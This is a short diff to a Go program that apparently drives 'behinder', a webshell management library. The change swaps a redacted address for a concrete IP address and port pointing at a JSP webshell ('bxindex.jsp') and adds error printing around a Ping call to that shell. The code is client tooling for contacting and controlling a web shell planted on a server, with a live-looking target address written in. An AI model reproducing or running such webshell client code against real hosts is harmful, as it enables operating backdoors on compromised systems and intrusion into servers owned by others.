@@ -7,7 +7,7 @@ import (
 	"github.com/Go0p/wsm/lib/shell/behinder"
 )
 
-const JspErrorShellUrl = "http://***REMOVED***:8088/bxindex.jsp"
+const JspErrorShellUrl = "http://139.196.175.86:8088/bxindex.jsp"
 
 func main() {
 	info := wsm.BehinderInfo{
@@ -29,7 +29,11 @@ func main() {
 		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: false},
 		Content:        "xxxxxxx",
 	}
-	i := bx.Ping(p)
+	i, err := bx.Ping(p)
+	if err != nil {
+		fmt.Printf("%v\n", err)
+		fmt.Printf("stack trace:\n%+v\n", err)
+	}
 	fmt.Println(i)
 	//z := &behinder.BasicInfoParams{
 	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
